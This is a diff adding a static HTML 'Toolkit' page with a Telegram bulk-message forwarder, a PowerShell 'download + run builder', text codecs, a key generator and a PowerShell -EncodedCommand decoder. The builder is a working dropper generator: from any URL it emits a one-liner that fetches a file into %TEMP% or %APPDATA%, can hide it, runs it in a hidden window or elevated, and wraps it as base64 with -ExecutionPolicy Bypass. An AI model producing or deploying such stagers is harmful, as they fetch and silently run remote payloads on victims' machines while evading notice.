@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Toolkit</title>
+<meta name="description" content="TG tools, PowerShell builder, encode/decode">
+<style>
+:root {
+  --bg: #0b0d12;
+  --panel: #12151c;
+  --panel2: #181c26;
+  --line: #2a3140;
+  --text: #e8eaef;
+  --muted: #8b93a7;
+  --accent: #6ea8ff;
+  --accent2: #a78bfa;
+  --ok: #4ade80;
+  --warn: #fbbf24;
+  --err: #f87171;
+  --radius: 12px;
+  --font: "Segoe UI", system-ui, -apple-system, sans-serif;
+  --mono: ui-monospace, "Cascadia Code", "JetBrains Mono", Consolas, monospace;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: var(--font);
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  background-image:
+    radial-gradient(900px 400px at 10% -10%, rgba(110,168,255,.12), transparent 55%),
+    radial-gradient(700px 360px at 90% 0%, rgba(167,139,250,.10), transparent 50%);
+}
+a { color: var(--accent); }
+.wrap { max-width: 980px; margin: 0 auto; padding: 28px 18px 64px; }
+header { margin-bottom: 22px; }
+header h1 {
+  font-size: 1.55rem;
+  font-weight: 650;
+  letter-spacing: -0.02em;
+}
+header p { color: var(--muted); font-size: 0.92rem; margin-top: 6px; }
+.tabs {
+  display: flex; flex-wrap: wrap; gap: 6px;
+  margin-bottom: 20px; padding: 6px;
+  background: var(--panel); border: 1px solid var(--line); border-radius: 14px;
+}
+.tab {
+  border: 0; background: transparent; color: var(--muted);
+  padding: 9px 14px; border-radius: 10px; cursor: pointer;
+  font: 600 12px/1 var(--font); letter-spacing: .02em;
+}
+.tab:hover { color: var(--text); background: rgba(255,255,255,.04); }
+.tab.on { color: #0b0d12; background: linear-gradient(135deg, var(--accent), var(--accent2)); }
+.panel { display: none; }
+.panel.on { display: block; animation: fade .18s ease; }
+@keyframes fade { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: none; } }
+.card {
+  background: var(--panel); border: 1px solid var(--line);
+  border-radius: var(--radius); padding: 18px; margin-bottom: 14px;
+}
+.card h2 {
+  font-size: 0.78rem; text-transform: uppercase; letter-spacing: .08em;
+  color: var(--muted); margin-bottom: 14px; font-weight: 650;
+}
+label {
+  display: block; font-size: 0.72rem; text-transform: uppercase;
+  letter-spacing: .06em; color: var(--muted); margin-bottom: 6px; font-weight: 600;
+}
+input[type=text], input[type=password], input[type=number], textarea, select {
+  width: 100%; background: var(--panel2); border: 1px solid var(--line);
+  border-radius: 10px; color: var(--text); padding: 11px 12px;
+  font: 13px/1.45 var(--mono); outline: none;
+}
+input:focus, textarea:focus, select:focus { border-color: var(--accent); }
+textarea { min-height: 140px; resize: vertical; }
+.row { display: grid; gap: 12px; margin-bottom: 12px; }
+.row2 { grid-template-columns: 1fr 1fr; }
+.row3 { grid-template-columns: 1fr 1fr 1fr; }
+@media (max-width: 720px) { .row2, .row3 { grid-template-columns: 1fr; } }
+.hint { font-size: 12px; color: var(--muted); margin-top: 6px; }
+.btn {
+  border: 0; border-radius: 10px; padding: 12px 16px; cursor: pointer;
+  font: 650 12px/1 var(--font); letter-spacing: .04em; text-transform: uppercase;
+}
+.btn-primary {
+  background: linear-gradient(135deg, var(--accent), var(--accent2));
+  color: #0b0d12; width: 100%;
+}
+.btn-primary:disabled { opacity: .35; cursor: not-allowed; }
+.btn-ghost {
+  background: transparent; color: var(--muted); border: 1px solid var(--line);
+  width: 100%; margin-top: 8px;
+}
+.btn-sm {
+  background: var(--panel2); color: var(--text); border: 1px solid var(--line);
+  padding: 8px 12px; border-radius: 8px; font-size: 11px; cursor: pointer;
+}
+.btn-sm:hover { border-color: var(--accent); }
+.actions { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
+.stats {
+  display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin: 14px 0;
+}
+@media (max-width: 640px) { .stats { grid-template-columns: 1fr 1fr; } }
+.stat {
+  background: var(--panel2); border: 1px solid var(--line); border-radius: 10px;
+  padding: 12px; text-align: center;
+}
+.stat b { display: block; font-size: 1.25rem; }
+.stat span { font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: .06em; }
+.progress { height: 4px; background: var(--line); border-radius: 99px; overflow: hidden; margin: 10px 0 16px; }
+.progress > i { display: block; height: 100%; width: 0; background: linear-gradient(90deg, var(--accent), var(--accent2)); transition: width .25s; }
+.log {
+  background: #0a0c10; border: 1px solid var(--line); border-radius: 10px;
+  height: 180px; overflow: auto; padding: 10px 12px; font: 12px/1.6 var(--mono);
+}
+.log .ok { color: var(--ok); } .log .err { color: var(--err); } .log .info { color: var(--muted); }
+.msg-list { display: flex; flex-direction: column; gap: 6px; max-height: 420px; overflow: auto; }
+.msg-item {
+  display: grid; grid-template-columns: 120px 1fr auto; gap: 10px;
+  background: var(--panel2); border: 1px solid var(--line); border-radius: 10px; padding: 10px 12px;
+}
+@media (max-width: 640px) { .msg-item { grid-template-columns: 1fr; } }
+.msg-from { font-size: 12px; color: var(--muted); }
+.msg-body { font-size: 13px; word-break: break-word; }
+.msg-time { font-size: 11px; color: var(--muted); }
+.cbs { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+@media (max-width: 640px) { .cbs { grid-template-columns: 1fr; } }
+.cb {
+  display: flex; gap: 8px; align-items: flex-start; padding: 10px;
+  background: var(--panel2); border: 1px solid var(--line); border-radius: 10px;
+  font-size: 12px; cursor: pointer;
+}
+.cb input { margin-top: 2px; }
+.pathbox {
+  margin-top: 10px; padding: 10px 12px; border-radius: 10px;
+  background: rgba(110,168,255,.08); border: 1px solid rgba(110,168,255,.25);
+  font: 12px/1.5 var(--mono); word-break: break-all;
+}
+pre.out {
+  margin-top: 10px; padding: 12px; background: #0a0c10; border: 1px solid var(--line);
+  border-radius: 10px; font: 12px/1.55 var(--mono); white-space: pre-wrap; word-break: break-all;
+  max-height: 360px; overflow: auto;
+}
+.toast {
+  position: fixed; left: 50%; bottom: 22px; transform: translateX(-50%) translateY(120%);
+  background: var(--ok); color: #052e16; padding: 10px 16px; border-radius: 999px;
+  font: 650 12px/1 var(--font); transition: transform .2s; z-index: 50;
+}
+.toast.on { transform: translateX(-50%) translateY(0); }
+footer { margin-top: 28px; color: var(--muted); font-size: 12px; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <h1>Toolkit</h1>
+    <p>TG forward · PowerShell builder · encode/decode · keys. Static site for Vercel.</p>
+  </header>
+
+  <nav class="tabs" id="tabs">
+    <button class="tab on" data-tab="tg">TG Forward</button>
+    <button class="tab" data-tab="msgs">Messages</button>
+    <button class="tab" data-tab="ps">PowerShell</button>
+    <button class="tab" data-tab="codec">Encode / Decode</button>
+    <button class="tab" data-tab="keys">Keys</button>
+    <button class="tab" data-tab="psdec">PS Decode</button>
+  </nav>
+
+  <!-- TG Forward -->
+  <section class="panel on" id="tab-tg">
+    <div class="card">
+      <h2>Bot</h2>
+      <div class="row">
+        <div>
+          <label>Bot token</label>
+          <input type="password" id="token" placeholder="123456:AA..." autocomplete="off">
+          <div class="hint" id="botHint"></div>
+        </div>
+      </div>
+      <div class="row row2">
+        <div>
+          <label>From chat id</label>
+          <input type="text" id="fromChat" placeholder="-100... or @channel">
+        </div>
+        <div>
+          <label>To chat id</label>
+          <input type="text" id="toChat" placeholder="-100... or user id">
+        </div>
+      </div>
+      <div class="row row3">
+        <div>
+          <label>Msg id from</label>
+          <input type="number" id="msgFrom" value="1">
+        </div>
+        <div>
+          <label>Msg id to</label>
+          <input type="number" id="msgTo" value="100">
+        </div>
+        <div>
+          <label>Delay ms</label>
+          <input type="number" id="delay" value="350">
+        </div>
+      </div>
+      <button class="btn btn-primary" id="startBtn" type="button">Start forward</button>
+      <button class="btn btn-ghost" id="stopBtn" type="button" style="display:none">Stop</button>
+    </div>
+    <div class="card" id="progressCard" style="display:none">
+      <h2 id="progressTitle">Running</h2>
+      <div class="progress"><i id="progressFill"></i></div>
+      <div class="stats">
+        <div class="stat"><b id="sCurrent">0</b><span>current id</span></div>
+        <div class="stat"><b id="sForwarded">0</b><span>forwarded</span></div>
+        <div class="stat"><b id="sSkipped">0</b><span>skipped</span></div>
+        <div class="stat"><b id="sErrors">0</b><span>errors</span></div>
+      </div>
+      <div class="log" id="logBox"></div>
+    </div>
+  </section>
+
+  <!-- Messages -->
+  <section class="panel" id="tab-msgs">
+    <div class="card">
+      <h2>Recent updates</h2>
+      <div class="actions">
+        <button class="btn-sm" type="button" id="loadMsgs">Refresh getUpdates</button>
+        <span class="hint" id="msgsStatus"></span>
+      </div>
+      <div class="msg-list" id="msgList" style="margin-top:12px">
+        <div class="hint">Open this tab and press Refresh (token from TG Forward).</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- PowerShell builder (Wave-style) -->
+  <section class="panel" id="tab-ps">
+    <div class="card">
+      <h2>Download + run builder</h2>
+      <div class="row">
+        <div>
+          <label>File URL</label>
+          <input type="text" id="psUrl" placeholder="https://example.com/file.exe">
+        </div>
+      </div>
+      <div class="row row2">
+        <div>
+          <label>File name</label>
+          <input type="text" id="psName" placeholder="auto from URL">
+        </div>
+        <div>
+          <label>Save to</label>
+          <select id="psDir">
+            <option value="TEMP">%TEMP%</option>
+            <option value="LOCALAPPDATA">%LOCALAPPDATA%</option>
+            <option value="APPDATA">%APPDATA%</option>
+            <option value="DOWNLOADS">Downloads</option>
+            <option value="CUSTOM">Custom path</option>
+          </select>
+        </div>
+      </div>
+      <div class="row" id="psCustomWrap" style="display:none">
+        <div>
+          <label>Custom path</label>
+          <input type="text" id="psCustom" placeholder="C:\Users\Public\App">
+        </div>
+      </div>
+      <div class="cbs" style="margin:12px 0">
+        <label class="cb"><input type="checkbox" id="psHidden"> Hidden attribute</label>
+        <label class="cb"><input type="checkbox" id="psSilent" checked> Hidden window</label>
+        <label class="cb"><input type="checkbox" id="psWait"> Wait for process</label>
+        <label class="cb"><input type="checkbox" id="psAdmin"> Run elevated</label>
+        <label class="cb"><input type="checkbox" id="psMkdir" checked> Create folder</label>
+        <label class="cb"><input type="checkbox" id="psB64"> Base64-encoded command</label>
+      </div>
+      <div class="pathbox" id="psPath">path: —</div>
+      <div class="actions">
+        <button class="btn-sm" type="button" data-ps-tab="compact">Compact</button>
+        <button class="btn-sm" type="button" data-ps-tab="plain">Readable</button>
+        <button class="btn-sm" type="button" data-ps-tab="b64">Base64</button>
+        <button class="btn-sm" type="button" id="psCopy">Copy</button>
+      </div>
+      <pre class="out" id="psOut">Paste a URL above</pre>
+    </div>
+  </section>
+
+  <!-- Codec -->
+  <section class="panel" id="tab-codec">
+    <div class="card">
+      <h2>Text transforms</h2>
+      <div class="row">
+        <div>
+          <label>Input</label>
+          <textarea id="codecIn" placeholder="text or encoded data"></textarea>
+        </div>
+      </div>
+      <div class="row row2">
+        <div>
+          <label>Mode</label>
+          <select id="codecMode">
+            <option value="b64e">Base64 encode</option>
+            <option value="b64d">Base64 decode</option>
+            <option value="urlenc">URL encode</option>
+            <option value="urldec">URL decode</option>
+            <option value="hexe">Hex encode</option>
+            <option value="hexd">Hex decode</option>
+            <option value="ue">Unicode escape</option>
+            <option value="ud">Unicode unescape</option>
+          </select>
+        </div>
+        <div style="display:flex;align-items:flex-end;gap:8px">
+          <button class="btn btn-primary" type="button" id="codecRun" style="width:auto;padding:12px 20px">Run</button>
+          <button class="btn-sm" type="button" id="codecCopy">Copy out</button>
+          <button class="btn-sm" type="button" id="codecSwap">Swap</button>
+        </div>
+      </div>
+      <div class="row">
+        <div>
+          <label>Output</label>
+          <textarea id="codecOut" readonly></textarea>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Keys -->
+  <section class="panel" id="tab-keys">
+    <div class="card">
+      <h2>Random generators</h2>
+      <div class="row row3">
+        <div>
+          <label>Length</label>
+          <input type="number" id="keyLen" value="32" min="8" max="256">
+        </div>
+        <div>
+          <label>Alphabet</label>
+          <select id="keyAlpha">
+            <option value="hex">Hex</option>
+            <option value="alnum">Alphanumeric</option>
+            <option value="base64">Base64-ish</option>
+            <option value="uuid">UUID v4</option>
+          </select>
+        </div>
+        <div style="display:flex;align-items:flex-end">
+          <button class="btn btn-primary" type="button" id="keyGen">Generate</button>
+        </div>
+      </div>
+      <div class="row">
+        <div>
+          <label>Result</label>
+          <input type="text" id="keyOut" readonly>
+        </div>
+      </div>
+      <div class="actions">
+        <button class="btn-sm" type="button" id="keyCopy">Copy</button>
+        <button class="btn-sm" type="button" id="keyGen5">Generate 5</button>
+      </div>
+      <pre class="out" id="keyList" style="display:none"></pre>
+    </div>
+  </section>
+
+  <!-- PS Decode -->
+  <section class="panel" id="tab-psdec">
+    <div class="card">
+      <h2>Decode PowerShell one-liners</h2>
+      <p class="hint" style="margin-bottom:12px">Supports -EncodedCommand / -enc base64, and nested FromBase64String snippets.</p>
+      <div class="row">
+        <div>
+          <label>Encoded command or full line</label>
+          <textarea id="psDecIn" placeholder="powershell -enc JAB..."></textarea>
+        </div>
+      </div>
+      <button class="btn btn-primary" type="button" id="psDecRun">Decode</button>
+      <pre class="out" id="psDecOut">—</pre>
+    </div>
+  </section>
+
+  <footer>Static HTML · drop on Vercel as-is · no backend required for local tools. TG API calls run from your browser.</footer>
+</div>
+<div class="toast" id="toast">Copied</div>
+
+<script>
+const $ = id => document.getElementById(id);
+const toast = (m) => {
+  const t = $('toast'); t.textContent = m || 'Copied'; t.classList.add('on');
+  clearTimeout(t._t); t._t = setTimeout(() => t.classList.remove('on'), 1400);
+};
+async function copyText(s) {
+  try { await navigator.clipboard.writeText(s); } catch {
+    const ta = document.createElement('textarea'); ta.value = s; document.body.appendChild(ta); ta.select();
+    document.execCommand('copy'); ta.remove();
+  }
+  toast('Copied');
+}
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+function esc(s) { return String(s).replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c])); }
+
+/* tabs */
+document.querySelectorAll('.tab').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('.tab').forEach(b => b.classList.remove('on'));
+    document.querySelectorAll('.panel').forEach(p => p.classList.remove('on'));
+    btn.classList.add('on');
+    $('tab-' + btn.dataset.tab).classList.add('on');
+  });
+});
+
+/* TG bot hint */
+let botTimer = null;
+$('token').addEventListener('input', () => {
+  const val = $('token').value.trim();
+  const hint = $('botHint');
+  clearTimeout(botTimer);
+  if (!val.includes(':')) { hint.textContent = ''; return; }
+  hint.textContent = '...';
+  botTimer = setTimeout(async () => {
+    try {
+      const r = await fetch('https://api.telegram.org/bot' + val + '/getMe');
+      const j = await r.json();
+      hint.textContent = j.ok ? ('@' + j.result.username + ' — ' + j.result.first_name) : 'invalid token';
+    } catch { hint.textContent = ''; }
+  }, 500);
+});
+
+/* Forwarder */
+let stopFlag = false, forwarded = 0, skipped = 0, errors = 0;
+function logLine(cls, msgId, text) {
+  const box = $('logBox');
+  const time = new Date().toLocaleTimeString('ru-RU');
+  const div = document.createElement('div');
+  div.innerHTML = `<span class="info">${time}</span> <span class="${cls}">#${msgId}: ${esc(text)}</span>`;
+  box.appendChild(div); box.scrollTop = box.scrollHeight;
+}
+function updateStats(cur, total) {
+  const pct = total ? Math.round((cur / total) * 100) : 0;
+  $('progressFill').style.width = pct + '%';
+  $('sCurrent').textContent = cur;
+  $('sForwarded').textContent = forwarded;
+  $('sSkipped').textContent = skipped;
+  $('sErrors').textContent = errors;
+}
+$('startBtn').addEventListener('click', async () => {
+  const token = $('token').value.trim();
+  const fromChat = $('fromChat').value.trim();
+  const toChat = $('toChat').value.trim();
+  const msgFrom = parseInt($('msgFrom').value, 10);
+  const msgTo = parseInt($('msgTo').value, 10);
+  const delay = Math.max(80, parseInt($('delay').value, 10) || 300);
+  if (!token || !fromChat || !toChat) return alert('Fill token and chat ids');
+  if (msgFrom > msgTo) return alert('msgFrom must be <= msgTo');
+  stopFlag = false; forwarded = 0; skipped = 0; errors = 0;
+  $('startBtn').disabled = true;
+  $('stopBtn').style.display = 'block';
+  $('progressCard').style.display = 'block';
+  $('progressTitle').textContent = 'Running';
+  $('logBox').innerHTML = '';
+  const total = msgTo - msgFrom + 1;
+  logLine('info', '—', `Range ${msgFrom}..${msgTo} (${total})`);
+  for (let id = msgFrom; id <= msgTo; id++) {
+    if (stopFlag) { logLine('info', id, 'stopped'); break; }
+    updateStats(id - msgFrom, total);
+    try {
+      const url = `https://api.telegram.org/bot${token}/forwardMessage?chat_id=${encodeURIComponent(toChat)}&from_chat_id=${encodeURIComponent(fromChat)}&message_id=${id}`;
+      const res = await fetch(url);
+      const data = await res.json();
+      if (data.ok) { forwarded++; logLine('ok', id, 'forwarded'); }
+      else {
+        const desc = data.description || '';
+        if (/not found|MESSAGE_ID_INVALID/i.test(desc)) skipped++;
+        else if (/Too Many Requests/i.test(desc)) {
+          const wait = (data.parameters && data.parameters.retry_after ? data.parameters.retry_after : 5) * 1000;
+          logLine('err', id, 'flood wait ' + (wait/1000) + 's');
+          await sleep(wait); id--;
+        } else if (/chat not found|CHAT_NOT_FOUND|Forbidden|blocked/i.test(desc)) {
+          logLine('err', id, desc); break;
+        } else { errors++; logLine('err', id, desc); }
+      }
+    } catch (e) { errors++; logLine('err', id, 'network'); }
+    updateStats(id - msgFrom + 1, total);
+    await sleep(delay);
+  }
+  $('progressFill').style.width = '100%';
+  $('progressTitle').textContent = stopFlag ? 'Stopped' : 'Done';
+  $('startBtn').disabled = false;
+  $('stopBtn').style.display = 'none';
+  $('stopBtn').disabled = false;
+  $('stopBtn').textContent = 'Stop';
+});
+$('stopBtn').addEventListener('click', () => {
+  stopFlag = true;
+  $('stopBtn').textContent = 'Stopping...';
+  $('stopBtn').disabled = true;
+});
+
+/* Messages */
+$('loadMsgs').addEventListener('click', async () => {
+  const token = $('token').value.trim();
+  const list = $('msgList');
+  if (!token) { list.innerHTML = '<div class="hint">Set token on TG Forward tab</div>'; return; }
+  $('msgsStatus').textContent = 'loading...';
+  try {
+    const r = await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=50&timeout=0`);
+    const data = await r.json();
+    if (!data.ok) { list.innerHTML = `<div class="hint">${esc(data.description||'error')}</div>`; return; }
+    const updates = data.result.filter(u => u.message || u.edited_message || u.channel_post).reverse();
+    $('msgsStatus').textContent = updates.length + ' items';
+    if (!updates.length) { list.innerHTML = '<div class="hint">No updates</div>'; return; }
+    list.innerHTML = updates.map(u => {
+      const msg = u.message || u.edited_message || u.channel_post;
+      const from = msg.from ? [msg.from.first_name, msg.from.last_name].filter(Boolean).join(' ') : (msg.chat && msg.chat.title) || 'chat';
+      const un = msg.from && msg.from.username ? '@' + msg.from.username : '';
+      const text = msg.text || msg.caption || (msg.photo ? '[photo]' : msg.document ? '[file]' : '');
+      const time = new Date(msg.date * 1000).toLocaleString('ru-RU');
+      return `<div class="msg-item"><div class="msg-from">${esc(from)}<br>${esc(un)}</div><div class="msg-body">${esc(text||'—')}</div><div class="msg-time">${esc(time)}</div></div>`;
+    }).join('');
+  } catch (e) {
+    list.innerHTML = `<div class="hint">${esc(e.message)}</div>`;
+  }
+});
+
+/* PowerShell builder */
+const DIR_MAP = {
+  TEMP: { ps: '$env:TEMP', show: '%TEMP%' },
+  LOCALAPPDATA: { ps: '$env:LOCALAPPDATA', show: '%LOCALAPPDATA%' },
+  APPDATA: { ps: '$env:APPDATA', show: '%APPDATA%' },
+  DOWNLOADS: { ps: "[Environment]::GetFolderPath('UserProfile')+'\\Downloads'", show: '%USERPROFILE%\\Downloads' },
+  CUSTOM: { ps: null, show: null }
+};
+function filenameFromUrl(u) {
+  try {
+    const p = new URL(u).pathname.split('/').filter(Boolean).pop() || 'payload.bin';
+    return decodeURIComponent(p.split('?')[0]) || 'payload.bin';
+  } catch { return 'payload.bin'; }
+}
+function sq(s) { return "'" + String(s).replace(/'/g, "''") + "'"; }
+function buildPs() {
+  const url = $('psUrl').value.trim();
+  if (!url) return null;
+  let name = $('psName').value.trim() || filenameFromUrl(url);
+  const dirKey = $('psDir').value;
+  let dirPs, dirShow;
+  if (dirKey === 'CUSTOM') {
+    const c = $('psCustom').value.trim() || 'C:\\Users\\Public';
+    dirPs = sq(c); dirShow = c;
+  } else {
+    dirPs = DIR_MAP[dirKey].ps; dirShow = DIR_MAP[dirKey].show;
+  }
+  const hidden = $('psHidden').checked;
+  const silent = $('psSilent').checked;
+  const wait = $('psWait').checked;
+  const admin = $('psAdmin').checked;
+  const mkdir = $('psMkdir').checked;
+  const asB64 = $('psB64').checked;
+  const pathExpr = `(Join-Path (${dirPs}) ${sq(name)})`;
+  let lines = [];
+  if (mkdir) lines.push(`New-Item -ItemType Directory -Force -Path (${dirPs}) | Out-Null`);
+  lines.push(`$u=${sq(url)}; $p=${pathExpr}`);
+  lines.push(`Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing`);
+  if (hidden) lines.push(`attrib +h $p`);
+  let start = `Start-Process -FilePath $p`;
+  if (silent) start += ` -WindowStyle Hidden`;
+  if (wait) start += ` -Wait`;
+  if (admin) start += ` -Verb RunAs`;
+  lines.push(start);
+  const plain = lines.join('; ');
+  const compact = plain;
+  let b64 = '';
+  try {
+    const utf16 = new TextEncoder('utf-16le', { NONSTANDARD_allowLegacyEncoding: true });
+  } catch (_) {}
+  // PowerShell -enc expects UTF-16LE base64
+  const bom = [];
+  for (let i = 0; i < plain.length; i++) {
+    const c = plain.charCodeAt(i);
+    bom.push(c & 0xff, (c >> 8) & 0xff);
+  }
+  b64 = btoa(String.fromCharCode.apply(null, bom));
+  const encCmd = `powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${b64}`;
+  return {
+    plain, compact: asB64 ? encCmd : compact, b64: encCmd,
+    shown: dirShow + '\\' + name
+  };
+}
+let psTab = 'compact';
+function renderPs() {
+  $('psCustomWrap').style.display = $('psDir').value === 'CUSTOM' ? 'block' : 'none';
+  const r = buildPs();
+  if (!r) {
+    $('psOut').textContent = 'Paste a URL above';
+    $('psPath').textContent = 'path: —';
+    return;
+  }
+  $('psPath').textContent = 'path: ' + r.shown;
+  $('psOut').textContent = r[psTab] || r.compact;
+}
+['psUrl','psName','psCustom'].forEach(id => $(id).addEventListener('input', renderPs));
+['psDir','psHidden','psSilent','psWait','psAdmin','psMkdir','psB64'].forEach(id => $(id).addEventListener('change', renderPs));
+document.querySelectorAll('[data-ps-tab]').forEach(b => b.addEventListener('click', () => {
+  psTab = b.getAttribute('data-ps-tab');
+  renderPs();
+}));
+$('psCopy').addEventListener('click', () => copyText($('psOut').textContent));
+renderPs();
+
+/* Codec */
+function runCodec() {
+  const mode = $('codecMode').value;
+  const inp = $('codecIn').value;
+  let out = '';
+  try {
+    if (mode === 'b64e') out = btoa(unescape(encodeURIComponent(inp)));
+    else if (mode === 'b64d') out = decodeURIComponent(escape(atob(inp.replace(/\s+/g,''))));
+    else if (mode === 'urlenc') out = encodeURIComponent(inp);
+    else if (mode === 'urldec') out = decodeURIComponent(inp);
+    else if (mode === 'hexe') out = Array.from(new TextEncoder().encode(inp)).map(b => b.toString(16).padStart(2,'0')).join('');
+    else if (mode === 'hexd') {
+      const clean = inp.replace(/[^0-9a-fA-F]/g,'');
+      const bytes = new Uint8Array(clean.match(/.{1,2}/g).map(h => parseInt(h,16)));
+      out = new TextDecoder().decode(bytes);
+    } else if (mode === 'ue') out = Array.from(inp).map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4,'0')).join('');
+    else if (mode === 'ud') out = inp.replace(/\\u([0-9a-fA-F]{4})/g, (_,h) => String.fromCharCode(parseInt(h,16)));
+  } catch (e) { out = 'Error: ' + e.message; }
+  $('codecOut').value = out;
+}
+$('codecRun').addEventListener('click', runCodec);
+$('codecCopy').addEventListener('click', () => copyText($('codecOut').value));
+$('codecSwap').addEventListener('click', () => {
+  const a = $('codecIn').value; $('codecIn').value = $('codecOut').value; $('codecOut').value = a;
+});
+
+/* Keys */
+function genKey() {
+  const len = Math.min(256, Math.max(8, parseInt($('keyLen').value,10) || 32));
+  const alpha = $('keyAlpha').value;
+  if (alpha === 'uuid') {
+    return crypto.randomUUID();
+  }
+  const bytes = new Uint8Array(len);
+  crypto.getRandomValues(bytes);
+  if (alpha === 'hex') return Array.from(bytes).map(b => b.toString(16).padStart(2,'0')).join('').slice(0, len);
+  const chars = alpha === 'base64'
+    ? 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_'
+    : 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  let s = '';
+  for (let i = 0; i < len; i++) s += chars[bytes[i] % chars.length];
+  return s;
+}
+$('keyGen').addEventListener('click', () => { $('keyOut').value = genKey(); $('keyList').style.display='none'; });
+$('keyCopy').addEventListener('click', () => copyText($('keyOut').value));
+$('keyGen5').addEventListener('click', () => {
+  const lines = [];
+  for (let i = 0; i < 5; i++) lines.push(genKey());
+  $('keyList').style.display = 'block';
+  $('keyList').textContent = lines.join('\n');
+  $('keyOut').value = lines[0];
+});
+
+/* PS Decode */
+$('psDecRun').addEventListener('click', () => {
+  let raw = $('psDecIn').value.trim();
+  const out = $('psDecOut');
+  try {
+    let m = raw.match(/-enc(?:odedcommand)?\s+([A-Za-z0-9+/=]+)/i);
+    let b64 = m ? m[1] : raw.replace(/\s+/g,'');
+    // try UTF-16LE (PS -enc)
+    const bin = atob(b64);
+    let utf16 = '';
+    for (let i = 0; i + 1 < bin.length; i += 2) {
+      utf16 += String.fromCharCode(bin.charCodeAt(i) | (bin.charCodeAt(i+1) << 8));
+    }
+    let text = utf16;
+    // nested FromBase64String
+    const nested = text.match(/FromBase64String\(['"]([A-Za-z0-9+/=]+)['"]\)/i);
+    if (nested) {
+      try {
+        const inner = atob(nested[1]);
+        text += '\n\n--- nested base64 ---\n' + inner;
+      } catch (_) {}
+    }
+    out.textContent = text;
+  } catch (e) {
+    out.textContent = 'Decode failed: ' + e.message;
+  }
+});
+</script>
+</body>
+</html>
